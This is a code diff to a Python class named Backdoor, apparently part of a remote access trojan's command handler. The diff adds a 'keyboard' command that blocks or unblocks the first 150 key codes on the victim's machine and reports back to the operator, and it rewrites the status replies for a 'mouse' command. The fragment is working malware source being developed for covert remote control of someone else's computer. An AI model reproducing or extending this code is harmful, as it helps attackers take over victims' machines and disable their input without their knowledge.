@@ -144,15 +144,23 @@ class Backdoor:
 				
 				elif command.split()[0] == "keyboard":
 					if command.split()[1] == "false":
-						self.reliable_send("false")
+						for i in range(150):
+							keyboard.block_key(i)
+						self.reliable_send("[+] Keyboard disconnected")
 					elif command.split()[1] == "true":
-						self.reliable_send("true")
+						for i in range(150):
+							keyboard.unblock_key(i)
+						self.reliable_send("[+] Keyboard connected")
+					else:
+						self.reliable_send("[-] Can't understand your command")
 
 				elif command.split()[0] == "mouse":
 					if command.split()[1] == "false":
-						self.reliable_send("false")
+						self.reliable_send("[+] Mouse disconnected")
 					elif command.split()[1] == "true":
-						self.reliable_send("true")
+						self.reliable_send("[+] Mouse connected")
+					else:
+						self.reliable_send("[-] Can't understand your command")
 
 
 
